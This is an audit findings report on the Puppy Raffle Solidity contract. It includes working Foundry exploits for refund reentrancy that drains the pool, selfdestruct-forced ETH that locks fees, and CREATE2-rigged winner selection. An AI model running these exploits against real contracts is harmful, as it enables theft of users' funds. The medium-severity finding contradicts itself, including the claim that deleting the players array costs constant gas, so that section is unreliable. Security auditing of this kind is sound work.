# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle** is an on-chain raffle that lets anyone win a collectible Puppy NFT while sharing ETH prize money with a fee recipient.

• Players call `enterRaffle(address[] newPlayers)` and send `entranceFee` (1 ETH by default) for _each_ supplied address. The contract rejects duplicate entries and under-payment, keeping a clean `players` array.

• At any time before a winner is drawn a player may invoke `refund(uint256 index)` to cancel their ticket and reclaim the full fee, automatically removing their slot.

• Once `raffleDuration` (1 day in the deployment script) has elapsed **and** at least four unique players exist, anyone can call `selectWinner()`. A pseudo-random index is chosen, the winner is minted an ERC-721 Puppy whose metadata encodes rarity (common, rare, legendary), and receives the pooled ETH minus a protocol fee.

• Collected fees accumulate in `totalFees`; the owner can `withdrawFees()` and can update the `feeAddress` via `changeFeeAddress()`.

• The accompanying Foundry tests exhaustively cover entry logic, refunds, winner selection, NFT URI accuracy, and fee withdrawal, while `DeployPuppyRaffle.sol` automates deployment with preset parameters.

The result is a transparent, trust-minimized raffle with provable NFT rewards and built-in revenue sharing.
## Critical Risk Findings
[C-1]. Reentrancy issue in PuppyRaffle::refund
## High Risk Findings
[H-1]. DOS issue in PuppyRaffle::withdrawFees
[H-2]. Randomness issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. DOS issue in PuppyRaffle::enterRaffle, selectWinner


### Number of Findings
- C: 1
- H: 2
- M: 1
- L: 0
- I: 0



# Critical Risk Findings

## [C-1]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends ETH to a user before updating the state that validates the refund. Specifically, the line `players[playerIndex] = address(0);` is executed after `payable(msg.sender).sendValue(entranceFee);`. The `sendValue` function uses a low-level `.call` which forwards all available gas, making a reentrancy attack possible. An attacker can create a contract with a `receive()` fallback function that calls `refund()` again. Since the `players` array has not been updated, the checks will pass, and the attacker will receive another refund. This loop can be repeated until the contract's entire ETH balance is drained.

## Impact
An attacker can drain all ETH deposited by players into the raffle, leading to a direct theft of user funds. The entire prize pool is at risk.

## Proof of Concept
1. Several legitimate users enter the raffle, funding the contract with their entrance fees.
2. An attacker deploys a malicious contract and uses it to enter the raffle once.
3. The attacker then calls `refund()` from their malicious contract.
4. The `PuppyRaffle` contract starts sending the refund ETH, triggering the attacker's `receive()` function.
5. Inside `receive()`, the attacker's contract immediately calls `refund()` on `PuppyRaffle` again.
6. Because the `players` array has not yet been modified for the attacker's index, the re-entrant call succeeds, and another refund is sent.
7. This process repeats, draining all available ETH from the `PuppyRaffle` contract into the attacker's contract.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract MaliciousRefund {
    PuppyRaffle public raffle;
    uint256 public entranceFee;
    uint256 public attacks;

    constructor(PuppyRaffle _raffle) payable {
        raffle = _raffle;
        entranceFee = _raffle.entranceFee();
    }

    // kick-off
    function trigger() external {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(arr);
        uint256 idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx);
    }

    receive() external payable {
        attacks++;
        uint256 idx = raffle.getActivePlayerIndex(address(this));
        if (address(raffle).balance >= entranceFee && raffle.players(idx) == address(this)) {
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, address(0xFEE), 1 days);
    }

    function _arr(address a) internal pure returns (address[] memory arr) {
        arr = new address[](1);
        arr[0] = a;
    }

    function testRefundReentrancy() public {
        // seed contract with 3 honest players
        address alice = address(0x1);
        address bob   = address(0x2);
        address carol = address(0x3);
        vm.deal(alice, 2 ether);
        vm.deal(bob,   2 ether);
        vm.deal(carol, 2 ether);

        vm.prank(alice); raffle.enterRaffle{value: entranceFee}(_arr(alice));
        vm.prank(bob);   raffle.enterRaffle{value: entranceFee}(_arr(bob));
        vm.prank(carol); raffle.enterRaffle{value: entranceFee}(_arr(carol));

        // deploy attacker funded with one ticket
        MaliciousRefund attacker = new MaliciousRefund{value: entranceFee}(raffle);
        uint256 attackerStartBal = address(attacker).balance;
        uint256 raffleStartBal   = address(raffle).balance;

        // launch attack
        attacker.trigger();

        // attacker drained everything
        assertEq(address(raffle).balance, 0);
        assertEq(address(attacker).balance, raffleStartBal + attackerStartBal);
        assertGt(attacker.attacks(), 1);
    }
}

## Suggested Mitigation
Follow Checks-Effects-Interactions: set `players[playerIndex] = address(0);` before transferring funds OR add `nonReentrant` modifier from OpenZeppelin’s `ReentrancyGuard` to the `refund` function.



# High Risk Findings

## [H-1]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function has a brittle check `require(address(this).balance == uint256(totalFees), ...)`. This check is intended to prevent withdrawal while a raffle is active, but it has unintended side effects.
1. **Front-running DoS:** An attacker can watch the mempool for a `withdrawFees` transaction. They can then front-run it with a call to `enterRaffle` for the *next* raffle, sending a small amount of ETH. This makes `address(this).balance > totalFees`, causing the withdrawal to fail. This can be repeated to permanently prevent the fee address from collecting fees.
2. **Locked funds via `selfdestruct`:** The strict equality check is vulnerable to forced ETH payments. An attacker can deploy a contract, fund it with dust ETH, and then `selfdestruct` it, sending the ETH to the `PuppyRaffle` contract. This will permanently make `address(this).balance > totalFees`, locking all collected fees in the contract forever.

## Impact
An attacker can make `withdrawFees()` permanently or repeatedly revert, leaving all protocol fees trapped in the contract. If the attacker forces a single wei by `selfdestruct`, the loss is **permanent** because the equality check will never be true again. This constitutes an unrecoverable loss of protocol revenue (20 % of every raffle) and prevents the fee recipient from ever receiving the funds.

## Proof of Concept
/* Self-destruct griefing */
1. Someone finishes a raffle → `totalFees > 0`, `players.length == 0`, `address(this).balance == totalFees`.
2. The attacker deploys the helper below, funds it with 1 wei and calls `destroy()` targeting `PuppyRaffle`:
   ```solidity
   contract ForceETH {
       constructor() payable {}
       function destroy(address payable to) external { selfdestruct(to); }
   }
   ```
3. `PuppyRaffle` now holds `totalFees + 1` wei while `totalFees` is unchanged.
4. Any subsequent call to `withdrawFees()` reverts forever because `address(this).balance != totalFees`.

/* Front-run griefing (summarised) */
Mempool-watcher enters the next raffle with a higher gas price right before the fee recipient’s `withdrawFees()` tx. The new entrance fee breaks the equality and the withdrawal reverts. The attacker can repeat this every time fees become withdrawable, creating an ongoing DoS.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceETH {
    constructor() payable {}
    function destroy(address payable to) external { selfdestruct(to); }
}

contract WithdrawFeesDoSTest is Test {
    PuppyRaffle raffle;
    uint256 entrance = 1 ether;
    address feeAddr = address(0xFEE);
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(entrance, feeAddr, duration);
        // populate players so a raffle can finish
        address[4] memory p = [address(1), address(2), address(3), address(4)];
        vm.prank(address(1));
        raffle.enterRaffle{value: entrance}(toDyn(p));
        vm.warp(block.timestamp + duration + 1);
        raffle.selectWinner(); // fees accrued, players reset
    }

    function testWithdrawFeesGetsStuckByForcedETH() public {
        uint256 fees = raffle.totalFees();
        assertGt(fees, 0);

        // force-send 1 wei
        ForceETH force = new ForceETH{value: 1 wei}();
        force.destroy(payable(address(raffle)));
        assertEq(address(raffle).balance, fees + 1);

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }

    /* helper */
    function toDyn(address[4] memory arr) internal pure returns (address[] memory d) {
        d = new address[](4);
        for (uint i; i < 4; ++i) d[i] = arr[i];
    }
}

## Suggested Mitigation
Decouple the liveness check from the ether balance:

```solidity
function withdrawFees() external {
    require(players.length == 0, "PuppyRaffle: raffle still active" );
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: no fees");

    totalFees = 0;
    (bool ok, ) = feeAddress.call{value: feesToWithdraw}("");
    require(ok, "withdraw failed");
}
```
`players.length == 0` correctly guarantees that no entrance fees are currently held for an active raffle, while removing the fragile equality check prevents DoS via forced ether or front-running.

## [H-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
The randomness used to select a winner and determine NFT rarity is derived from insecure on-chain sources: `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))`. All of these parameters are predictable, and some are controllable by the person creating the block (a miner or validator).
An attacker can predict the outcome of a `selectWinner` transaction in the mempool or repeatedly call the function, adjusting parameters like `gasPrice` to land in a different block, until the outcome is favorable to them. A malicious miner can directly manipulate the outcome to ensure they win.

## Impact
The integrity of the raffle is compromised. An attacker can unfairly influence or directly control who wins the prize pool and what rarity of NFT is minted. This undermines the core purpose of the contract and can lead to theft of the entire prize pool from legitimate participants.

## Proof of Concept
1. Attacker enters the raffle once, becoming the player at index `i` (e.g. 0).
2. After `raffleDuration` expires, the attacker computes off-chain a salt `s` such that the CREATE2-derived address `addr = keccak256(0xFF || deployer || s || keccak256(initCode))[12:]` satisfies
   `uint256(keccak256(abi.encodePacked(addr, block.timestamp, block.difficulty))) % players.length == i`
   for the current block (timestamp and difficulty can be read in the node’s pending block template).
3. In a single transaction the attacker deploys `Exploit` with that salt; the constructor of `Exploit` immediately calls `raffle.selectWinner()`.
4. Because `msg.sender` inside `selectWinner` is `addr` (chosen in step-2) the modulus equals `i`, so `winner == attacker`.
5. `Exploit` self-destructs (optional). The attacker deterministically wins the entire prize pool and the NFT rarity draw that follows.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract Exploit {
    constructor(address raffle) {
        PuppyRaffle(raffle).selectWinner();
    }
}

contract RandomnessExploitTest is Test {
    PuppyRaffle raffle;
    address playerOne = vm.addr(1);
    uint256 entrance = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(entrance, address(10), 1 days);
        // attacker is playerOne at index 0
        vm.deal(playerOne, 10 ether);
        vm.prank(playerOne);
        address[] memory arr = new address[](1);
        arr[0] = playerOne;
        raffle.enterRaffle{value: entrance}(arr);
        // add three honest players
        for (uint256 i = 2; i <= 4; i++) {
            address p = vm.addr(i);
            vm.deal(p, 10 ether);
            address[] memory a = new address[](1);
            a[0] = p;
            vm.prank(p);
            raffle.enterRaffle{value: entrance}(a);
        }
    }

    function computeCreate2(bytes32 salt, bytes memory bytecode) internal view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xFF), address(this), salt, keccak256(bytecode))
        );
        return address(uint160(uint256(hash)));
    }

    function testWinWithCreate2() public {
        // fast-forward so raffle can be settled
        vm.warp(block.timestamp + 1 days + 1);

        bytes memory init = type(Exploit).creationCode;
        bytes memory initWithArgs = abi.encodePacked(init, abi.encode(address(raffle)));
        bytes32 chosenSalt;
        // search for a salt that puts winnerIndex == 0 (playerOne)
        for (uint256 i; ; i++) {
            bytes32 salt = bytes32(i);
            address predicted = computeCreate2(salt, initWithArgs);
            uint256 idx = uint256(keccak256(abi.encodePacked(predicted, block.timestamp, block.difficulty))) % 4;
            if (idx == 0) {
                chosenSalt = salt;
                break;
            }
        }
        address exploit;
        assembly {
            exploit := create2(0, add(initWithArgs, 0x20), mload(initWithArgs), chosenSalt)
            if iszero(exploit) { revert(0, 0) }
        }
        // constructor of Exploit already called selectWinner()
        assertEq(raffle.previousWinner(), playerOne);
    }
}

## Suggested Mitigation
Do not use on-chain data for randomness. Integrate a provably fair and tamper-proof randomness solution like Chainlink VRF (Verifiable Random Function). The contract would request a random number from the VRF oracle and use the result in a separate callback function to select the winner, preventing any manipulation.



# Medium Risk Findings

## [M-1]. DOS issue in PuppyRaffle::enterRaffle, selectWinner

## Description
The contract contains two unbounded loops that can lead to Denial of Service.
1. `enterRaffle()`: A nested loop is used to check for duplicate players. Its complexity is O(n^2) on the total number of players. As the `players` array grows, the gas cost to execute this function will eventually exceed the block gas limit, preventing anyone from entering the raffle.
2. `selectWinner()`: This function uses `delete players` to reset the raffle. The gas cost of deleting a dynamic array is proportional to its size. If the raffle accumulates a large number of players (which is possible via the integer overflow vulnerability or even legitimate use), the gas cost to call `selectWinner` could exceed the block gas limit. This would make it impossible to ever select a winner, permanently trapping all funds in the contract.

## Impact
The quadratic duplicate-check inside `enterRaffle()` makes the gas cost grow with O(n²) relative to the total number of players already recorded. Once the array reaches a few thousand entries, every further `enterRaffle()` call will run out of gas and revert, preventing new users from joining the raffle until the current round finishes or players voluntarily refund themselves. No funds are lost and `selectWinner()` remains callable, so the issue is limited to a temporary denial-of-service for additional entrants.

## Proof of Concept
1. Deploy the contract with an `entranceFee` of 1 wei to avoid ether-funding friction.
2. Sequentially add 1,400 unique players, one address per call:
   for (uint i=0; i<1400; i++) {
       address[] memory a = new address[](1);
       a[0] = address(uint160(i+1));
       puppyRaffle.enterRaffle{value: 1 wei}(a);
   }
   The cumulative gas used stays below the block limit because the inner array is still <1,400²/2 ≈ 1 M iterations spread over many transactions.
3. Now try to add player #1401 in a **single** call:
   address[] memory last = new address[](1);
   last[0] = address(0xdead);
   puppyRaffle.enterRaffle{value: 1 wei}(last);
   This transaction performs ≈ (1,401²-1,401)/2 ≈ 981,000 storage comparisons, consuming >30 M gas and invariably running out of gas, so it always reverts. No one can add more players until the round ends or players leave via refunds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../../src/PuppyRaffle.sol";

contract GasDosTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 wei;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(this), 1 days);
    }

    function testGasDosOnEnterRaffle() public {
        // fill the array with 1,400 single-address entries
        for (uint256 i = 0; i < 1400; i++) {
            address[] memory a = new address[](1);
            a[0] = address(uint160(i + 1));
            raffle.enterRaffle{value: ENTRANCE_FEE}(a);
        }
        // expect the next entry to revert (OOG) because of quadratic duplicate scan
        address[] memory last = new address[](1);
        last[0] = address(0xDEAD);
        vm.expectRevert();
        raffle.enterRaffle{value: ENTRANCE_FEE}(last);
    }
}

## Suggested Mitigation
Maintain a mapping(address => bool) hasEntered that is set to true when an address is appended to `players`. Before pushing a new entry require(!hasEntered[_addr]). This removes the O(n²) duplicate scan and makes `enterRaffle()` O(1) regardless of array size. No change is required for `selectWinner()` because `delete players` already costs constant gas.



